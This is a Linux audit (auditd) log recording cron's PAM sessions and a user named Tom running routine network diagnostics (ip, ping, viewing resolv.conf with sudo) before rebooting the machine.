type=SYSCALL msg=audit(1789391821.011:313): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1214 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=23 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789391821.011:313): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789391821.011:314): pid=1214 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789391821.015:315): pid=1215 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789391821.019:316): pid=1214 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789391821.019:317): pid=1214 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789395421.035:318): pid=1233 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789395421.039:319): pid=1233 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789395421.039:320): pid=1233 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=24 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789395421.039:320): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1233 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=24 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789395421.039:320): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789395421.039:321): pid=1233 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789395421.039:322): pid=1234 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789395421.099:323): pid=1233 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789395421.099:324): pid=1233 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789396224.283:325): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a527970 a1=55a97a513730 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1241 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396224.283:325): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789396224.283:325): cwd="/home/Tom"
type=PATH msg=audit(1789396224.283:325): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396224.283:325): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396224.283:325): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396224.283:325): proctitle=69700061
type=SYSCALL msg=audit(1789396231.799:326): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a460aa0 a1=55a97a527990 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1242 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396231.799:326): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396231.799:326): argc=2 a0="ping" a1="github.com"
type=CWD msg=audit(1789396231.799:326): cwd="/home/Tom"
type=PATH msg=audit(1789396231.799:326): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396231.799:326): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396231.799:326): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396231.799:326): proctitle=70696E67006769746875622E636F6D
type=SYSCALL msg=audit(1789396245.995:327): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a513730 a1=55a97a4ff130 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1243 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="clear" exe="/usr/bin/clear" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396245.995:327): argc=1 a0="clear"
type=CWD msg=audit(1789396245.995:327): cwd="/home/Tom"
type=PATH msg=audit(1789396245.995:327): item=0 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396245.995:327): item=1 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396245.995:327): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396245.995:327): proctitle="clear"
type=SYSCALL msg=audit(1789396455.619:328): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4aec70 a1=55a97a4d3b80 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1246 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396455.619:328): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396455.619:328): argc=2 a0="ping" a1="192.168.0.254"
type=CWD msg=audit(1789396455.619:328): cwd="/home/Tom"
type=PATH msg=audit(1789396455.619:328): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396455.619:328): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396455.619:328): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396455.619:328): proctitle=70696E67003139322E3136382E302E323534
type=SYSCALL msg=audit(1789396462.315:329): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a523970 a1=55a97a53df60 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1247 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396462.315:329): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789396462.315:329): cwd="/home/Tom"
type=PATH msg=audit(1789396462.315:329): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396462.315:329): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396462.315:329): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396462.315:329): proctitle=69700061
type=SYSCALL msg=audit(1789396480.199:330): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a516d80 a1=55a97a4d9660 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1248 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396480.199:330): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396480.199:330): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789396480.199:330): cwd="/home/Tom"
type=PATH msg=audit(1789396480.199:330): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396480.199:330): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396480.199:330): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396480.199:330): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789396573.883:331): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a445350 a1=55a97a5153c0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=1250 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396573.883:331): argc=2 a0="ip" a1="route"
type=CWD msg=audit(1789396573.883:331): cwd="/home/Tom"
type=PATH msg=audit(1789396573.883:331): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396573.883:331): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396573.883:331): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396573.883:331): proctitle=697000726F757465
type=SYSCALL msg=audit(1789396611.223:332): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a509e60 a1=55a97a4474d0 a2=55a97a45be50 a3=33894510fd2ba690 items=3 ppid=630 pid=1261 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396611.223:332): argc=3 a0="sudo" a1="cat" a2="/etc/resolv.conf"
type=CWD msg=audit(1789396611.223:332): cwd="/home/Tom"
type=PATH msg=audit(1789396611.223:332): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396611.223:332): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396611.223:332): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396611.223:332): proctitle=7375646F00636174002F6574632F7265736F6C762E636F6E66
type=USER_AUTH msg=audit(1789396617.359:333): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789396617.359:334): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789396617.359:335): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=636174202F6574632F7265736F6C762E636F6E66 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789396617.363:336): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789396617.363:337): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789396617.367:338): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789396617.367:339): pid=1261 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789396678.931:340): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a587440 a1=55a97a585740 a2=55a97a45be50 a3=33894510fd2ba690 items=3 ppid=630 pid=1264 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396678.931:340): argc=2 a0="ip" a1="neig"
type=CWD msg=audit(1789396678.931:340): cwd="/home/Tom"
type=PATH msg=audit(1789396678.931:340): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396678.931:340): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396678.931:340): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396678.931:340): proctitle=6970006E656967
type=SYSCALL msg=audit(1789396847.479:341): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a576be0 a1=55a97a58ec00 a2=55a97a45be50 a3=33894510fd2ba690 items=3 ppid=630 pid=1266 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396847.479:341): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789396847.479:341): cwd="/home/Tom"
type=PATH msg=audit(1789396847.479:341): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396847.479:341): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396847.479:341): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396847.479:341): proctitle=69700061
type=SYSCALL msg=audit(1789396852.279:342): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a574f40 a1=55a97a523950 a2=55a97a45be50 a3=33894510fd2ba690 items=3 ppid=630 pid=1267 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396852.279:342): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396852.279:342): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789396852.279:342): cwd="/home/Tom"
type=PATH msg=audit(1789396852.279:342): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396852.279:342): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396852.279:342): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396852.279:342): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789396937.423:343): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a573950 a1=55a97a584db0 a2=55a97a45be50 a3=33894510fd2ba690 items=3 ppid=630 pid=1271 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396937.423:343): argc=4 a0="sudo" a1="reboot" a2="-h" a3="now"
type=CWD msg=audit(1789396937.423:343): cwd="/home/Tom"
type=PATH msg=audit(1789396937.423:343): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396937.423:343): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396937.423:343): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396937.423:343): proctitle=7375646F007265626F6F74002D68006E6F77
type=USER_ACCT msg=audit(1789396937.427:344): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789396937.427:345): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=7265626F6F74202D68206E6F77 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789396937.431:346): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789396937.431:347): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789396937.455:348): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789396937.455:349): pid=1271 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SERVICE_STOP msg=audit(1789396937.487:350): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.491:351): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.495:352): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
